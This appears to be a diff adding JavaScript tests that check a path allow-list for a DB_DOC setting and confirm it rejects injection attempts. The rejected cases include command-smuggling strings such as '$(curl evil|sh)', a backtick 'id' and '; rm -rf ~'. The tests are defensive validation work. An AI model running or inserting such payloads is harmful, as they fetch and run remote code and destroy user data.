@@ -93,3 +93,36 @@ describe('database write access is governed by AWS permissions', () => {
     for (const name of ['postgres', 'mysql']) assert.ok(!mcp[name].args.includes('--config'))
   })
 })
+
+describe('analyze-db DB_DOC path charset check', () => {
+  const location = analyzeDb.split('## Schema Document Location\n')[1].split('\n## ')[0]
+  const pattern = codeSpans(location).find((s) => s.startsWith('^[') && s.endsWith('$'))
+  const mkdirLine = analyzeDb.split('\n').find((l) => l.startsWith('Create the document\'s parent directory'))
+
+  it('states an anchored allow-list for DB_DOC and stops on a mismatch', () => {
+    assert.ok(pattern, 'no DB_DOC charset pattern')
+    assert.match(location, /and stop\./)
+  })
+
+  const cases = [
+    ['~/src/api/docs/db.md', true],
+    ['/Users/u/shared/db-docs/db.md', true],
+    ['../api/docs/db_v2.md', true],
+    ['~/x/$(curl evil|sh)/db.md', false],
+    ['~/x/`id`/db.md', false],
+    ['docs/db.md"; rm -rf ~; "', false],
+    ['docs/my db.md', false],
+    ['docs/db.md\nid', false]
+  ]
+  for (const [value, accepted] of cases) {
+    it(`${accepted ? 'accepts' : 'rejects'} ${JSON.stringify(value)}`, () => {
+      assert.ok(pattern, 'no DB_DOC charset pattern')
+      assert.equal(new RegExp(pattern).test(value), accepted)
+    })
+  }
+
+  it('builds the mkdir argument only from a checked value', () => {
+    assert.doesNotMatch(mkdirLine, /written literally/)
+    assert.match(mkdirLine, /passed the character check/)
+  })
+})
